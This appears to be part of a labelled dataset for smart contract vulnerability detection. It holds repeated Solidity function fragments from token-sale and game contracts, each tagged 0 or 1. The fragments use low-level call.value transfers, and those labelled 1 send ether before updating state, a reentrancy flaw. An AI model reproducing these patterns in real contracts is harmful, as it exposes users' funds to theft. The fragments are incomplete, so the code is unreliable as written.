---------------------------------
217 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
218 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
219 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
220 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
221 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
222 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
223 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
224 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
225 36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
226 35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
227 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
228 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
229 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
230 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
231 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
232 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
233 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
234 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
235 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
236 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
